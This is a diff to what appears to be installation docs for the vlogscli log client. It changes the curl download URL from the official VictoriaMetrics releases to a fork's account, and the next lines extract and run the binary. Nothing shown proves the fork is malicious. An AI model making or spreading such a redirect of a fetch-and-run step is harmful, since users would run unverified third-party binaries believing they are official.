@@ -23,7 +23,7 @@ or from [docker images](https://hub.docker.com/r/victoriametrics/vlogscli/tags):
 ### Running `vlogscli` from release binary
 
 ```sh
-curl -L -O https://github.com/VictoriaMetrics/VictoriaMetrics/releases/download/v0.41.0-victorialogs/vlogscli-linux-amd64-v0.41.0-victorialogs.tar.gz
+curl -L -O https://github.com/aginetwork7/VictoriaMetrics/releases/download/v0.41.0-victorialogs/vlogscli-linux-amd64-v0.41.0-victorialogs.tar.gz
 tar xzf vlogscli-linux-amd64-v0.41.0-victorialogs.tar.gz
 ./vlogscli-prod
 ```
